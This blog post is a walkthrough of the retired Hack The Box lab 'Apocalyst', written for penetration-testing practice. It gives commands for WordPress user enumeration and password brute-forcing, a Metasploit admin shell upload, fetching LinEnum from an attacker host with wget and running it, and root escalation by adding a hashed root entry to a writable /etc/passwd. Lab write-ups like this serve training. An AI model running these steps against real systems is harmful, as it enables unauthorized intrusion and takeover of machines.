<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Box Challenge: Apocalyst Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-challenge-apocalyst-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-03-24T09:52:50+00:00">March 24, 2018</time><time class="updated" datetime="2025-07-07T16:20:47+00:00">July 7, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to solve another CTF challenge “<strong>Apocalyst </strong>” which is available online for those who want to increase their skill in penetration testing and black box testing. <strong>Hack the Box</strong> presents <strong>Apocalyst</strong>, a retried vulnerable lab for making online penetration practices according to your experience level; they offer a collection of vulnerable labs as challenges from beginners to expert level. We will start a new series of Hack the Box, beginning with Apocalyst craft, which is designed for beginners.</span></p>
<p><span style="color: #000000;"><strong>Level: </strong>Intermediate</span></p>
<h5><span style="color: #000000;"><strong>Task:</strong> Find <strong>user.txt</strong> and <strong>root.txt</strong> file in the victim’s machine.</span></h5>
<p><span style="color: #000000;">Since these labs are online available therefore they have static IP and IP of <strong>Apocalyst</strong> is <strong>10.10.10.46</strong> so let’s begin with nmap port enumeration.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 10.10.10.46</pre>
<p><span style="color: #000000;">From the given below image, you can observe we found port 22, 80 are open in the victim’s network.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6BvokF1RJYE/WrYYY-DKlPI/AAAAAAAAVlQ/yGeXC-PKsGQjz0x4m5F0JSaEIIJl3SRdQCEwYBhgL/s1600/1.png" border="0" data-original-height="491" data-original-width="686"/></span></p>
<p><span style="color: #000000;">Knowing port 80 is open in the victim’s network, we preferred to explore his IP in the browser but didn’t find any remarkable clue on his Apocalypse Preparation blog for the next step.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-O8H9y7tjxC0/WrYYbTeAFqI/AAAAAAAAVl8/H55tFvwG2q08p9q8HQXN0q5fFXRhwIV0gCEwYBhgL/s1600/2.png" border="0" data-original-height="502" data-original-width="722"/></span></p>
<p><span style="color: #000000;">Now we have added the domain name of the target machine in the /etc/hosts file to access the webpage.<br/>
</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat hosts</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-3NY2XimM5nI/WrYYcoB7X-I/AAAAAAAAVnE/pKesIJLpgG0nluuaE3GW7FJyJNGJUVAMQCEwYBhgL/s1600/4.png" border="0" data-original-height="170" data-original-width="552"/></span></p>
<p><span style="color: #000000;">Next, we decided to give the name of the third host in the browser. Which has given us the Welcome page of the Apocalyst lab along with a message Apocalypse Preparation Blog.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-4y7eCadtrK0/WrYYcwA9eVI/AAAAAAAAVnM/fC6doiJaZbY2ldmtcrYD7KQFFrerhSNJQCEwYBhgL/s1600/5.png" border="0" data-original-height="529" data-original-width="778"/></span></p>
<p><span style="color: #000000;">Now we decided to use the command on the URL that we have entered in the browser. To check if there are any kind of vulnerable themes, plugins etc.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wpscan -u http://apocalyst.htb/ --enumerate t --enumerate p --enumerate u</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-EGptBXGRKLE/WrYYc-a-J9I/AAAAAAAAVnM/zbxMVnFl2fQ4sy3WDjPtkkiySAyY31epQCEwYBhgL/s1600/6.png" border="0" data-original-height="260" data-original-width="785"/></span></p>
<p><span style="color: #000000;">The<strong> wpscan </strong>has enumerated the usernames where we have found the login credentials as<strong> falaraki.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-V6xHzXVOh_4/WrYYdCMLxpI/AAAAAAAAVnM/Jn8JJesnLG0yUr8GUj197pME5_vnywXcQCEwYBhgL/s1600/7.png" border="0" data-original-height="229" data-original-width="634"/></span></p>
<p><span style="color: #000000;">Next, we use the<strong> dirb</strong> tool of kali to enumerate the directories from the <strong>.txt</strong> file. The command we have used is </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb http://10.10.10.46/ /root/Desktop/dict.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-t-c_MiW5stM/WrYYdWzUB0I/AAAAAAAAVnI/78h4pqHDduMG1QrmomBTkCfeJwdHdfZXwCEwYBhgL/s1600/8.png" border="0" data-original-height="255" data-original-width="591"/></span></p>
<p><span style="color: #000000;">Now that we have found an important directory named as <strong>Rightiousness </strong>in the .txt file we enumerated.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-v9j0aCFhF2I/WrYYdTKK9MI/AAAAAAAAVnQ/jpAmLPXG0AQUoBkhI5U2eZPArtni5afXgCEwYBhgL/s1600/9.png" border="0" data-original-height="501" data-original-width="476"/></span></p>
<p><span style="color: #000000;">So next we decided to explore <strong>http://10.10.10.46/Rightiousness</strong> through browser URL and what we see is an image opened on the browser. As shown below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-36zPA7zIsP8/WrYYYxJpX-I/AAAAAAAAVnQ/mlAT0sYCjVQ52igav643o3CP-W4qOhDTwCEwYBhgL/s1600/10.png" border="0" data-original-height="447" data-original-width="770"/></span></p>
<p><span style="color: #000000;">The image got us wondering there must a clue behind the Image. On second thought we decided to do <strong>Steganalysis</strong> on the image. Using the <strong>steghide –info image.jpg</strong> command in the kali terminal. And we found there is a list.txt file embedded behind the image.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-J3fu1cU9gCc/WrYYYxQiLpI/AAAAAAAAVnM/b7WrGEWYCAsG8OxtXPNhjiwtQOg7gIbdQCEwYBhgL/s1600/11.png" border="0" data-original-height="184" data-original-width="514"/></span></p>
<p><span style="color: #000000;">Now we need to extract that list.txt file embedded behind the image. Therefore we used <strong>steghide –extract –sf image.jpg</strong> command for extraction. <strong>We simply need to leave the Enter passphrase option blank and Press Enter</strong>. List.txt file has successfully been <strong>extracted</strong> on our <strong>Desktop</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-H09MpVjf0e0/WrYYZvun-6I/AAAAAAAAVm4/GpJZMbuXX4YUKBq-hTb4Lpj89soVU1UqACEwYBhgL/s1600/12.png" border="0" data-original-height="238" data-original-width="525"/></span></p>
<p><span style="color: #000000;">Again we have used wpscan to find out the password credentials for the login credentials Falaraki we earlier took using the wpscan. Here we have used </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wpscan –u http://10.10.10.46 --username falaraki --wordlist /root/Desktop/list.txt</pre>
<p><span style="color: #000000;">the command to enumerate the password from the list.txt file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ct21lNcjqNM/WrYYZ3uECfI/AAAAAAAAVnE/ogLBOxwVf9kd8S5hmnmrhATxnWeTd9u-gCEwYBhgL/s1600/13.png" border="0" data-original-height="260" data-original-width="862"/></span></p>
<p><span style="color: #000000;">We see that for login credentials <strong>falaraki</strong>, the password credentials matched is <strong>Transclisiation</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-CFREGgr_pzs/WrYYZzMxuoI/AAAAAAAAVnE/4M0vA3NAUE8ihiEorHSM_GvPK6A2oIoOgCEwYBhgL/s1600/14.png" border="0" data-original-height="317" data-original-width="844"/></span></p>
<p><span style="color: #000000;">After finding the username and password, we have used metasploit’s exploit <strong>wp_admin_shell_upload</strong> to upload the shell and get the meterpreter which is shown below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/unix/webapp/wp_admin_shell_upload
set rhost 10.10.10.46
set username falaraki
set password Transclisiation
exploit</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-W93nTeLCet0/WrYYaCM0ptI/AAAAAAAAVm8/4-fH3VVdpd8On9ermfRv_LqvhLrIb3Z9QCEwYBhgL/s1600/15.png" border="0" data-original-height="492" data-original-width="714"/></span></p>
<p><span style="color: #000000;">Once we have got the meterpreter. We have used command <strong>ls –la /home </strong>to check what kind of directories are on home. Then we check inside the falaraki directory using <strong>command ls –la /home/falaraki</strong>, here we found out the user.txt file and used cat /home/falaraki/user.txt to read the file content which contains our first <strong>FLAG!!</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-4_CYAyBYeWQ/WrYYaVF04RI/AAAAAAAAVm8/IDg7nn14GEIZK_cGZsThQdX812KJVEr5gCEwYBhgL/s1600/16.png" border="0" data-original-height="513" data-original-width="673"/></span></p>
<p><span style="color: #000000;">Now we used command <strong>ls –la</strong> in the falaraki directory as shown. Here we discovered a file named <strong>.secret </strong>which left us curious to read its content using the <strong>cat .secret</strong> command. It contains an <strong>encoded code</strong> in <strong>base64</strong> which we need to decode to read the content behind it.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-NV16qX6pxGs/WrYYaRqAwUI/AAAAAAAAVm4/OTe-WSijlz0_Ir4CRE52k3ZjU5t6hHrhwCEwYBhgL/s1600/17.png" border="0" data-original-height="359" data-original-width="724"/></span></p>
<p><span style="color: #000000;">Now to decode the encoded content in base64 we used command <strong>echo “Encoded Content” | base64 –d. </strong>This gave us a decoded form of the content as shown in the image below.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ykSzW8Mcqsc/WrYYa4zF0EI/AAAAAAAAVnM/H91D7wTlI40l8Eyds8a-kTVxNWTyTp-FgCEwYBhgL/s1600/18.png" border="0" data-original-height="72" data-original-width="722"/></span></p>
<p><span style="color: #000000;">Now Let’s we try to access the user falaraki using ssh, here we have given the command </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh falaraki@10.10.10.46</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-owVbSHTHhuk/WrYYbCAJ4eI/AAAAAAAAVnA/xM99WBpoNt8nS8yrJP90YRw15khU7TdSQCEwYBhgL/s1600/19.png" border="0" data-original-height="324" data-original-width="628"/></span></p>
<p><span style="color: #000000;">On another terminal <strong>LinEnum tool</strong> from GitHub which is very well-known for checking privilege escalation in directories. Firstly, we have downloaded <strong>the Linenum-master.zip</strong> file from <strong>GitHub</strong>. After that, we have shared the Linenum-master folder over the server by making a simple HTTP server on port 80 using the command </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">unzip LinEnum-master.zip
cd LinEnum-master/
ls
python –m SimpleHTTPServer 80</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-F1WhnQZMcT8/WrYYbWq_YqI/AAAAAAAAVnM/gLkVKc40jV8R6JNa9eu-Xb39ZZn5BG_rQCEwYBhgL/s1600/20.png" border="0" data-original-height="271" data-original-width="653"/></span></p>
<p><span style="color: #000000;">Then, we will download the shared file using <strong>wget http://10.10.14.3/LinEnum.sh</strong> command for our falaraki@apocalyst user. Now need to give permission to LinEnum.sh using command chmod 777 Linenum.sh. Now to execute it we have given command ./LinEnum.sh.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QUwWHbx5NSk/WrYYbsX4KhI/AAAAAAAAVnQ/2vIMWIRvIIsGiuxtkxfbnXt3jhE5PqiMQCEwYBhgL/s1600/21.png" border="0" data-original-height="283" data-original-width="634"/></span></p>
<p><span style="color: #000000;">The LinEnum tool has given all the sensitive files that can be read/write in the falaraki directory.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-zWWawUEExsE/WrYYb4yWjCI/AAAAAAAAVm8/1xDGkOr6nOQjZEzNv0YgDPkLIjv2TFogQCEwYBhgL/s1600/22.png" border="0" data-original-height="143" data-original-width="551"/></span></p>
<p><span style="color: #000000;">In a new terminal, we are using OpenSSL to make a new salted combined username and password in MD5 algorithm. For this the command used is</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">openssl passwd -1 -salt raj pass123</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-uApn45EaeJo/WrYYb5JOFpI/AAAAAAAAVm8/8-UfHsrYIDA9a61PAscHpdXohsFGllCIgCEwYBhgL/s1600/23.png" border="0" data-original-height="43" data-original-width="465"/></span></p>
<p><span style="color: #000000;">Now using vi /etc/passwd command we are editing the passwd directory for adding a new user. The for the new user is <strong>username: Salted Value of username and password:0:0:root:/root:/bin/bash, </strong>we have saved this new user by using: <strong>wq</strong> command.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-hNZQJqaFerM/WrYYcIcMqwI/AAAAAAAAVm8/VzTzKK5vaZcMoEaJX_3aByi4zQ6tfyM8ACEwYBhgL/s1600/24.png" border="0" data-original-height="577" data-original-width="625"/></span></p>
<p><span style="color: #000000;">Now we simply check if the user has been successfully added or not, so as to find them. For this, we have used <strong>su -raj </strong>command and in the password, we have given the password for this user which is <strong>pass123. </strong>We are finally in the root privilege of the<strong> Apocalyst </strong>by using <strong>ls</strong> command we see a <strong>root.txt</strong> file, whose content we would like to see by using the <strong>cat root.txt</strong> command. </span></p>
<p><span style="color: #000000;"><strong>Finally, we found our final FLAG!!</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-eeJ4RQyrk4I/WrYYcUwHOYI/AAAAAAAAVm8/4orzm0Z7E6sPHNn6ahgBLYduCPwtGqeJgCEwYBhgL/s1600/25.png" border="0" data-original-height="134" data-original-width="440"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this </span><strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Ashray Gupta is a Researcher and Technical Writer at Hacking Articles<strong>. </strong>He is a certified ethical hacker, web penetration tester and a researcher in nanotechnology. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/ashray-gupta-b77221b6/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
